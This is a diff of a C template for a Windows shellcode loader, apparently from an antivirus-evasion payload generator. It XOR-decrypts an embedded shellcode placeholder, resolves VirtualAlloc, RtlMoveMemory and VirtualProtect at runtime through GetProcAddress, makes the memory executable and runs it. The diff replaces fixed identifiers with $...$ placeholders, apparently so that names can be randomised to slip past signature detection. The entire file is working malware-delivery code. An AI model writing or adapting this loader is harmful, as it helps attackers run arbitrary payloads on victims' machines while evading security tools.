@@ -1,33 +1,33 @@
 #include <windows.h>
 
-typedef BOOL(WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
-typedef VOID (WINAPI* pRtlMoveMemory)(VOID UNALIGNED* Destination,const VOID UNALIGNED* Source, SIZE_T Length);
+typedef BOOL (WINAPI* $VirtualProtectDec$)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+typedef LPVOID (WINAPI* $VirtualAllocDec$)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD  flProtect);
+typedef VOID (WINAPI* $RtlMoveMemoryDec$)(VOID UNALIGNED* Destination,const VOID UNALIGNED* Source, SIZE_T Length);
 
 int main(void) {
 	DWORD oldprotect = 0;
-	char encryptedShellcode[] = $SHELLCODE$;
+	char $EncryptedShellcodeVar$[] = $SHELLCODE$;
 	char key[] = "$KEY$";
 
-	char shellcode[sizeof encryptedShellcode];
+	char $ShellcodeVar$[sizeof $EncryptedShellcodeVar$];
 
 	int j = 0;
 
-	for (int i = 0; i < sizeof encryptedShellcode; i++) {
+	for (int i = 0; i < sizeof $EncryptedShellcodeVar$; i++) {
 		if (j == sizeof key - 1) j = 0;
-		shellcode[i] = encryptedShellcode[i] ^ key[j];
+		$ShellcodeVar$[i] = $EncryptedShellcodeVar$[i] ^ key[j];
 		j++;
 	}
 
-	pVirtualProtect pVP = (pVirtualProtect)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
-	pVirtualAlloc pVA = (pVirtualAlloc)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
-	pRtlMoveMemory pMM = (pRtlMoveMemory)GetProcAddress(GetModuleHandle("Ntdll.dll"), "RtlMoveMemory");
+	$VirtualProtectDec$ $VirtualProtectVar$ = ($VirtualProtectDec$)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
+	$VirtualAllocDec$ $VirtualAllocVar$ = ($VirtualAllocDec$)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
+	$RtlMoveMemoryDec$ $RtlMoveMemoryVar$ = ($RtlMoveMemoryDec$)GetProcAddress(GetModuleHandle("Ntdll.dll"), "RtlMoveMemory");
 
-	LPVOID pAddress = pVA(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	LPVOID pAddress = $VirtualAllocVar$(0, sizeof $ShellcodeVar$, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
-	pMM(pAddress, shellcode, sizeof shellcode);
+	$RtlMoveMemoryVar$(pAddress, $ShellcodeVar$, sizeof $ShellcodeVar$);
 
-	BOOL isUpdated = pVP(pAddress, sizeof shellcode, PAGE_EXECUTE_READ, &oldprotect);
+	BOOL isUpdated = $VirtualProtectVar$(pAddress, sizeof $ShellcodeVar$, PAGE_EXECUTE_READ, &oldprotect);
 
 	if (isUpdated != 0) {
 		((void(*)())pAddress)();
